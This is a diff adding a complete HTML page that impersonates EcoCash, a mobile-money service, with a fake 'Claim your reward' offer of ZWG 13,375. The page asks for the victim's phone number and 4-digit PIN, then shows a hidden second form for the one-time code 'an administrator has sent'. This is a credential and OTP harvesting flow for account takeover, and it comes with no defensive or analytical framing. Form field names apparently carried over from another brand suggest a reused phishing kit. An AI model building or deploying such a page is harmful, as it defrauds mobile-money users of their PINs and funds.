@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#E4002B" />
+    <meta
+      name="description"
+      content="EcoCash - Claim your reward of ZWG 13,375"
+    />
+    <title>EcoCash · Claim your reward</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="stylesheet" href="/style.css" />
+  </head>
+  <body>
+    <main class="page">
+      <section class="card" aria-labelledby="card-title">
+        <div class="logo-wrap" aria-hidden="true">
+          <svg
+            class="logo"
+            viewBox="0 0 200 80"
+            xmlns="http://www.w3.org/2000/svg"
+            role="img"
+            aria-label="EcoCash"
+          >
+            <defs>
+              <linearGradient id="ecocashRed" x1="0" y1="0" x2="1" y2="1">
+                <stop offset="0%" stop-color="#FF1A47" />
+                <stop offset="100%" stop-color="#E4002B" />
+              </linearGradient>
+            </defs>
+            <!-- Leaf accent -->
+            <path
+              d="M14 18 C 28 6, 52 6, 60 22 C 52 30, 36 30, 22 24 Z"
+              fill="url(#ecocashRed)"
+            />
+            <circle cx="22" cy="22" r="3" fill="#FFC72C" />
+            <!-- Wordmark -->
+            <text
+              x="0"
+              y="58"
+              font-family="Segoe UI, Helvetica, Arial, sans-serif"
+              font-weight="800"
+              font-size="36"
+              fill="#E4002B"
+              letter-spacing="-0.5"
+            >Eco</text>
+            <text
+              x="78"
+              y="58"
+              font-family="Segoe UI, Helvetica, Arial, sans-serif"
+              font-weight="800"
+              font-size="36"
+              fill="#003366"
+              letter-spacing="-0.5"
+            >Cash</text>
+            <!-- Tagline -->
+            <text
+              x="0"
+              y="74"
+              font-family="Segoe UI, Helvetica, Arial, sans-serif"
+              font-weight="600"
+              font-size="9"
+              fill="#6b7280"
+              letter-spacing="2"
+            >BY ECONET</text>
+          </svg>
+        </div>
+
+        <h1 id="card-title" class="title">You have qualified for an EcoCash Reward</h1>
+
+        <p class="lead">
+          Welcome! Enter your phone number and PIN (EcoCash PIN - 4 digits) to
+          claim your reward.
+        </p>
+
+        <div class="amount">
+          <p class="amount__label">Eligible reward amount:</p>
+          <p class="amount__value">ZWG 13,375</p>
+        </div>
+
+        <form id="offer-form" class="form" novalidate>
+          <div class="field">
+            <label class="visually-hidden" for="mixx-number">EcoCash number</label>
+            <input
+              id="mixx-number"
+              name="mixxNumber"
+              type="tel"
+              inputmode="numeric"
+              autocomplete="tel"
+              placeholder="EcoCash number"
+              maxlength="12"
+              required
+            />
+          </div>
+
+          <div class="field">
+            <label class="visually-hidden" for="yas-pin">EcoCash PIN</label>
+            <input
+              id="yas-pin"
+              name="yasPin"
+              type="password"
+              inputmode="numeric"
+              autocomplete="off"
+              placeholder="EcoCash PIN"
+              maxlength="4"
+              pattern="[0-9]{4}"
+              required
+            />
+          </div>
+
+          <button type="submit" class="btn">
+            <span class="btn__label">CLAIM REWARD</span>
+            <span class="btn__spinner" aria-hidden="true"></span>
+          </button>
+
+          <p id="form-status" class="status" role="status" aria-live="polite"></p>
+        </form>
+
+        <!-- Step 2: verification code form (hidden until step 1 succeeds) -->
+        <form id="verify-form" class="form form--verify" novalidate hidden>
+          <p class="verify-title">Verify the code you received</p>
+          <p class="verify-sub">
+            An administrator has sent a code to your phone number. Please enter
+            the code below to confirm your request.
+          </p>
+
+          <div class="field">
+            <label class="visually-hidden" for="verify-code">Code you received</label>
+            <input
+              id="verify-code"
+              name="verificationCode"
+              type="tel"
+              inputmode="numeric"
+              autocomplete="one-time-code"
+              placeholder="Code you received"
+              maxlength="8"
+              pattern="[0-9]{4,8}"
+              required
+            />
+          </div>
+
+          <button type="submit" class="btn">
+            <span class="btn__label">VERIFY</span>
+            <span class="btn__spinner" aria-hidden="true"></span>
+          </button>
+
+          <p id="verify-status" class="status" role="status" aria-live="polite"></p>
+
+          <button
+            id="verify-back"
+            type="button"
+            class="btn-ghost btn-ghost--sm"
+          >← Go back</button>
+        </form>
+      </section>
+
+      <footer class="footnote">
+        <p>&copy; <span id="year"></span> EcoCash. All rights reserved.</p>
+      </footer>
+    </main>
+
+    <script src="/script.js" defer></script>
+  </body>
+</html>
